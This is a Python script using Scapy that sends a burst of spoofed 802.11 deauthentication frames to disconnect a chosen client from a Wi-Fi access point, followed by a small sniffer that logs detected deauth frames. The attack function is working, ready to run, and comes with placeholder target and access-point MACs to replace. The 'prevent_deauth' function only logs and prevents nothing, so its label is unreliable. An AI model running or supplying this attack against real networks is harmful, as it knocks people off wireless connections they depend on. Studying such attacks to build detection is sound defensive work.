import logging  # Import logging module for logging messages
from scapy.all import *  # Import all functions from scapy
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap  # Import specific layers from scapy

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def deauth_attack(interface, target_mac, ap_mac):
    """
    Perform a deauthentication attack by sending deauth frames.
    :param interface: The network interface to use.
    :param target_mac: The MAC address of the target client.
    :param ap_mac: The MAC address of the access point.
    """
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) # Constructs the deauth frame using Dot11, Dot11Deauth, and RadioTap.
    # addr1: Target client's MAC address.
    # addr2: Access point's MAC address.
    # addr3: Access point's MAC address.
    frame = RadioTap()/dot11/Dot11Deauth(reason=7) # The frame is wrapped in a RadioTap layer and a Dot11Deauth layer with a reason code of 7 (unspecified reason).
    
    sendp(frame, iface=interface, count=100, inter=0.1) # Sends the frames using sendp.
    # The sendp function from Scapy is used to send the constructed frame on the specified network interface.
    # count=100: Sends 100 deauthentication frames.
    # inter=0.1: Interval of 0.1 seconds between each frame.
    logging.info(f"Sent deauth frames to {target_mac} from {ap_mac} on {interface}")

def detect_deauth(packet):
    """
    For each packet captured, the function checks if the packet has a Dot11Deauth layer.
    If a deauth frame is detected, a log message is generated with the MAC address of the sender.
    """
    if packet.haslayer(Dot11Deauth):
        mac_address = packet.addr2
        logging.warning(f"Detected deauth frame from {mac_address}")

def prevent_deauth(interface):
    """
    The sniff function from Scapy is used to start sniffing packets on the specified interface.
    prn=detect_deauth: For each packet captured, the detect_deauth function is called.
    store=False: Packets are not stored in memory to save resources.
    """
    sniff(iface=interface, prn=detect_deauth, store=False)

# Example usage
if __name__ == "__main__":
    interface = "wlan0"  # Replace with your network interface
    target_mac = "00:11:22:33:44:55"  # Replace with the target client's MAC address
    ap_mac = "66:77:88:99:AA:BB"  # Replace with the access point's MAC address
    
    # Start the deauth attack
    deauth_attack(interface, target_mac, ap_mac)
    
    # Prevent deauth attack by detecting it
    prevent_deauth(interface)
